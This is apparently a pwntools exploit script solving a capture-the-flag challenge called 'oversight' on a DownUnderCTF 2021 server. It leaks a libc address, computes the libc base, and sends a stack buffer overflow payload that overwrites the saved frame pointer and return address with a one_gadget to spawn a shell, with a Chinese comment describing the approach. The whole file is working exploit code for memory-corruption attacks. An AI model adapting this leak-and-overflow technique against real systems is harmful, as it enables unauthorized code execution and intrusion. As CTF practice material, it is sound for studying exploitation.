from pwn import *
context(os='linux', arch='amd64')
context.log_level = 'debug'

libc = ELF('./libc-2.27.so')
# libc_start_main = libc.sym['__libc_start_main']

if args.LOCAL:
    p = process('./oversight', env={'LD_PRELOAD': './libc-2.27.so'})
    print(p.pid)
    pause()
else:
    p = remote('pwn-2021.duc.tf', 31909)

p.sendlineafter(b'Press enter to continue\n', b'')
p.sendlineafter(b'Pick a number: ', b'27')

p.recvuntil(b'Your magic number is: ')
libc_start_main_addr = int(p.recv(12).decode(), 16) - 231

libc_base = libc_start_main_addr - libc.sym['__libc_start_main']
p.success("got libc base: {}".format(hex(libc_base)))

one_gadget = 0x4f432 + libc_base

p.sendlineafter(b'How many bytes do you want to read (max 256)? ', b'256')
# p.send(b'a'*256)

# 我们可以覆盖rbp，然后one_gadget一把梭
payload = b'a'*(0x100-0x60) + b'a'*8 + p64(one_gadget)
payload = payload.ljust(256, b'\x00')
# print(payload)
p.send(payload)
p.interactive()